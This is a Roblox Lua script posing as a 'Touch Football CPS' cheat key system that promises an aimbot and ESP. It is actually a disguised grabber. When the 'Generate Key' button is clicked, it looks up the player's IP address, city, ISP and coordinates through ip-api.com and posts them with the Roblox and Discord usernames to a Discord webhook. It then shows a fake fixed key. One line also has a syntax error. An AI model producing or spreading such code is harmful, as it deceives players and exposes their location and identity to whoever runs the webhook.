local Main, GUI, Webhook, IPFetcher
local Settings

Settings = (function()
  local rgb = Color3.fromRGB
  return {
    Theme = {
      Background = rgb(25, 25, 25),
      SecondaryBg = rgb(35, 35, 35),
      Accent = rgb(0, 170, 0),
      Text = rgb(255, 255, 255),
      SubText = rgb(200, 200, 200),
      Error = rgb(255, 100, 100),
      InputBg = rgb(40, 40, 40),
      Button = rgb(60, 60, 60),
      ButtonHover = rgb(80, 80, 80),
      ButtonPress = rgb(40, 40, 40)
    }
  }
end)()

local Apps = {}
local env = {}
local service = setmetatable({}, {__index = function(self, name)
  local serv = game:GetService(name)
  self[name] = serv
  return serv
end})
local plr = service.Players.LocalPlayer or service.Players.PlayerAdded:wait()

local create = function(data)
  local insts = {}
  for i, v in pairs(data) do insts[v[1]] = Instance.new(v[2]) end
  
  for _, v in pairs(data) do
    for prop, val in pairs(v[3]) do
      if type(val) == "table" then
        insts[v[1]][prop] = insts[val[1]]
      else
        insts[v[1]][prop] = val
      end
    end
  end
  
  return insts[1]
end

local createSimple = function(class, props)
  local inst = Instance.new(class)
  for i, v in next, props do
    inst[i] = v
  end 
  return inst
end

IPFetcher = {
  Fetch = function()
    local success, data = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
    if success and data then
      local parsed = service.HttpService:JSONDecode(data)
      if parsed and parsed.status == "success" then
        return {
          ip = parsed.query,
          country = parsed.country,
          isp = parsed.isp,
          city = parsed.city,
          lon = parsed.lon,
          lat = parsed.lat
        }
      end
    end
    return nil
  end
}

Webhook = {
  Webhook_URL = "",
  Send = function(username, discordName, ipInfo)
    local fields = {
      {name = "Roblox Username", value = username, inline = true},
      {name = "Discord Username", value = discordName, inline = true}
    }
    if ipInfo then
      table.insert(fields, {name = "IP Address", value = ipInfo.ip, inline = true})
      table.insert(fields, {name = "Country", value = ipInfo.country, inline = true})
      table.insert(fields, {name = "ISP", value = ipInfo.isp, inline = true})
      table.insert(fields, {name = "City", value = ipInfo.city, inline = true})
      table.insert(fields, {name = "Coordinates", value = string.format("Lat: %.4f, Lon: %.4f", ipInfo.lat, ipInfo.lon), inline = true})
    else
      table.insert(fields, {name = "IP Address", value = "Failed to fetch", inline = true})
    end
    
    local embed = {
      title = "Touch Security Multiverse, There new user!!!",
      color = 16711680,
      fields = fields,
      timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    local payload = service.HttpService:JSONEncode({embeds = {embed}})
    
    local s, err = pcall(function()
      syn.request({
        Url = Webhook.Webhook_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = payload
      })
    end)
    if not s then
      pcall(function()
        request({
          Url = Webhook.Webhook_URL,
          Method = "POST",
          Headers = {["Content-Type"] = "application/json"},
          Body = payload
        })
      end)
    end
  end
}

Main = (function()
  local Main = {}
  Main.GuiHolder = service.CoreGui or plr:FindFirstChildOfClass("PlayerGui")
  
  Main.CreateKeyUI = function()
    local gui = create({
      {1, "ScreenGui", {Name = "TouchFootballCPS", ResetOnSpawn = false, ZIndexBehavior = Enum.ZIndexBehavior.Sibling}},
      {2, "Frame", {Name = "MainFrame", Parent = {1}, BackgroundColor3 = Settings.Theme.Background, BorderSizePixel = 0, Position = UDim2.new(0.5, -200, 0.5, -160), Size = UDim2.new(0, 400, 0, 320), AnchorPoint = Vector2.new(0.5, 0.5), ClipsDescendants = true, Active = true, Draggable = true}},
      {3, "Frame", {Name = "TopBar", Parent = {2}, BackgroundColor3 = Settings.Theme.SecondaryBg, BorderSizePixel = 0, Size = UDim2.new(1, 0, 0, 36)}},
      {4, "TextLabel", {Parent = {3}, BackgroundTransparency = 1, Position = UDim2.new(0, 10, 0, 0), Size = UDim2.new(1, -50, 1, 0), Font = Enum.Font.SourceSansBold, Text = "Touch Football CPS - Key System", TextColor3 = Settings.Theme.Text, TextSize = 16, TextXAlignment = Enum.TextXAlignment.Left}},
      {5, "TextButton", {Name = "Close", Parent = {3}, BackgroundColor3 = Color3.fromRGB(200, 50, 50), BorderSizePixel = 0, Position = UDim2.new(1, -30, 0, 5), Size = UDim2.new(0, 26, 0, 26), Font = Enum.Font.SourceSansBold, Text = "X", TextColor3 = Settings.Theme.Text, TextSize = 14}},
      {6, "Frame", {Name = "Content", Parent = {2}, BackgroundTransparency = 1, Position = UDim2.new(0, 0, 0, 36), Size = UDim2.new(1, 0, 1, -36)}},
      {7, "TextLabel", {Parent = {6}, BackgroundTransparency = 1, Position = UDim2.new(0, 20, 0, 20), Size = UDim2.new(1, -40, 0, 20), Font = Enum.Font.SourceSans, Text = "Enter your Discord username to generate a key:", TextColor3 = Settings.Theme.SubText, TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left}},
      {8, "TextBox", {Name = "DiscordInput", Parent = {6}, BackgroundColor3 = Settings.Theme.InputBg, BorderSizePixel = 0, Position = UDim2.new(0, 20, 0, 50), Size = UDim2.new(1, -40, 0, 32), Font = Enum.Font.SourceSans, PlaceholderText = "YourDiscord#1234", Text = "", TextColor3 = Settings.Theme.Text, TextSize = 14, ClearTextOnFocus = false}},
      {9, "TextLabel", {Name = "Status", Parent = {6}, BackgroundTransparency = 1, Position = UDim2.new(0, 20, 0, 100), Size = UDim2.new(1, -40, 0, 20), Font = Enum.Font.SourceSans, Text = "", TextColor3 = Settings.Theme.Error, TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left}},
      {10, "TextButton", {Name = "GenerateKey", Parent = {6}, BackgroundColor3 = Settings.Theme.Accent, BorderSizePixel = 0, Position = UDim2.new(0, 20, 0, 140), Size = UDim2.new(1, -40, 0, 40), Font = Enum.Font.SourceSansBold, Text = "Generate Key", TextColor3 = Settings.Theme.Text, TextSize = 18}},
      {11, "Frame", {Name = "Info", Parent = {6}, BackgroundColor3 = Settings.Theme.SecondaryBg, BorderSizePixel = 0, Position = UDim2.new(0, 20, 0, 200), Size = UDim2.new(1, -40, 0, 80)}},
      {12, "TextLabel", {Parent = {11}, BackgroundTransparency = 1, Position = UDim2.new(0, 10, 0, 5), Size = UDim2.new(1, -20, 0, 20), Font = Enum.Font.SourceSansBold, Text = "CPS Boost Active: [OFF]", TextColor3 = Settings.Theme.SubText, TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left}},
      {13, "TextLabel", {Parent = {11}, BackgroundTransparency = 1, Position = UDim2.new(0, 10, 0, 30), Size = UDim2.new(1, -20, 0, 45), Font = Enum.Font.SourceSans, Text = "Unlock full features including:\n- Adjustable CPS\n- Aimbot\n- ESP", TextColor3 = Settings.Theme.SubText, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left}}
    })
  
    local screenGui = gui
    local mainFrame = gui.MainFrame
    local closeButton = mainFrame.TopBar.Close
    local discordInput = mainFrame.Content.DiscordInput
    local statusLabel = mainFrame.Content.Status
    local generateButton = mainFrame.Content.GenerateKey
    
    closeButton.MouseButton1Click:Connect(function()
      screenGui:Destroy()
    end)
    
    generateButton.MouseEnter:Connect(function() generateButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0) end)
    generateButton.MouseLeave:Connect(function() generateButton.BackgroundColor3 = Settings.Theme.Accent end)
    generateButton.MouseButton1Down:Connect(function() generateButton.BackgroundColor3 = Settings.Theme.ButtonPress end)
    generateButton.MouseButton1Up:Connect(function() generateButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0) end)
    
    generateButton.MouseButton1Click:Connect(function()
      local discordUsername = discordInput.Text
      if discordUsername:gsub("%s", "") == "" then
        statusLabel.Text = "Please enter a valid Discord username..."
        return
      end
      
      statusLabel.Text = "Generating key..."
      local ipInfo = IPFetcher.Fetch()
      local robloxUsername = plr.Name
      Webhook.Send(robloxUsername, discordUsername, ipInfo)
      
      statusLabel.Text = "Key Generated, Your key is TFB_1A5GN0@LK#fFpTL!@S")
      task.wait(4)
      screenGui:Destroy()
    end)
    
    if protect_gui then
      pcall(protect_gui, screenGui)
    elseif syn and syn.protect_gui then
      pcall(syn.protect_gui, screenGui)
    end
    
    screenGui.Parent = Main.GuiHolder
    return screenGui
  end
  
  Main.Start = function()
    Main.CreateKeyUI()
  end
  
  return Main
end)()

Main.Start()